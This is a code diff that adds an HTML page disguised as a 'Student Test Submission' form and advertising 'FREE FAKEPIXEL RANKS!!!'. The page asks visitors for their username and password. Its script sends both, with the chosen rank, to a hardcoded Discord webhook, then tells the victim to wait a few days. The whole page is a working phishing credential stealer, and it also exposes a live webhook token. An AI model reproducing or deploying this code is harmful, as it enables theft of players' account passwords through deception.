@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Test Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 50%;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        label {
+            font-weight: bold;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #response {
+            margin-top: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>FREE FAKEPIXEL RANKS!!!</h2>
+    <form id="testForm">
+        <!-- Username -->
+        <label for="name">Username:</label>
+        <input type="text" id="name" name="name" required>
+
+        <!-- Question 1: Short Answer -->
+        <label for="q1">1. What is your password?</label>
+        <input type="text" id="q1" name="q1" placeholder="Enter your answer" required>
+
+        <!-- Question 2: MCQ -->
+        <label for="q2">2. Which rank do you want?</label>
+        <select id="q2" name="q2" required>
+            <option value="" disabled selected>Select your answer</option>
+            <option value="VIP">A) VIP</option>
+            <option value="VIP+">B) VIP+</option>
+            <option value="MVP">C) MVP</option>
+            <option value="MVP+">D) MVP+</option>
+        </select>
+
+        <button type="button" onclick="submitForm()">Submit</button>
+        <div id="response"></div>
+    </form>
+</div>
+
+<script>
+    async function submitForm() {
+        const name = document.getElementById('name').value;
+        const q1 = document.getElementById('q1').value;
+        const q2 = document.getElementById('q2').value;
+
+        if (!name || !q1 || !q2) {
+            document.getElementById('response').innerHTML = "⚠️ Please fill out all fields!";
+            return;
+        }
+
+        const webhookUrl = "https://discord.com/api/webhooks/1352561831163465771/yPHw0LweY5Cijd-trN0hRwQxnFe05Johil3bKg07tV7fRy4znJsnIzHN5TNP1LkLq4qV";
+
+        const payload = {
+            content: `📚 **New Submission:**\n👤 **Username:** ${name}\n🌞 **Question** What is your password\n➡️ **Answer:** ${q1}\n🌍 **Q2:** What rank u need?\n✅ **Selected Option:** ${q2}`
+        };
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                document.getElementById('response').innerHTML = "✅ Submission sent successfully! Kindly wait a few days!";
+                document.getElementById('testForm').reset();
+            } else {
+                document.getElementById('response').innerHTML = "❌ Error sending submission!";
+            }
+        } catch (error) {
+            document.getElementById('response').innerHTML = "❌ Unable to send the submission!";
+        }
+    }
+</script>
+
+</body>
+</html>
